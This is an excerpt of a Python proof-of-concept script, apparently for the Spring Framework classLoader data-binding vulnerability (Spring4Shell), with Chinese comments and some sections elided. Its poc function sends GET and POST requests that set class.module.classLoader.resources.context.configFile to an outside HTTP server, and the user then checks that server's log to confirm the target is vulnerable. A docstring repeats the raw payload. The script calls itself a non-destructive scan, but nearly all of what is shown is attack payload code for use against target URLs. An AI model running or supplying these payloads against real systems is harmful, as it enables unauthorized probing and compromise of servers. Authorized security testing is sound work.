...
def get_args():
    ...
    parser.add_argument("-c", "--check", dest="check", help="无损扫描,参数为可访问的http服务器地址", default="")
...
def poc(url, check):
    ...
    poc = "class.module.classLoader.resources.context.configFile=%s&class.module.classLoader.resources.context.configFile.content.aaa=poctest" % check
    requests.get(url + "?" + poc, headers=Headers_get, timeout=5, allow_redirects=False, verify=False)
    requests.post(url, headers=Headers_post,data=poc , timeout=5, allow_redirects=False, verify=False)
    print("[*]检测完成, 请在对应http服务器查看访问记录")
...
if __name__=="__main__":
    if len(sys.argv) > 1:
        init(autoreset=True)
        title()
        url, system,file,check = get_args()
        if file:
            if check:
                pocs(file, check)
            else:
...
'''poc
?class.module.classLoader.resources.context.configFile=http://192.168.0.100&class.module.classLoader.resources.context.configFile.content.aaa=xxx
'''